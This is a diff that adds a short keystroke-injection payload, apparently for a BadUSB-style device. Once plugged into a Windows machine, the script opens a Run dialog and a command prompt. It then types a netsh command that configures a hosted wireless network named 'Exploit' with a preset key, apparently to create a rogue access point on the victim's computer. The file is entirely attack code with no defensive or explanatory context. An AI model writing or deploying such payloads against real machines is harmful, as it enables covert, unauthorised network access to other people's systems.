@@ -1,0 +1,7 @@
+CustomDelay:3000
+Press:131+114
+CustomDelay:1000
+PrintLine:cmd
+CustomDelay:1000
+PrintLine:netsh wlan set hostednetwork mode=allow ssid="Exploit" key="DotAgency"
+PrintLine:		
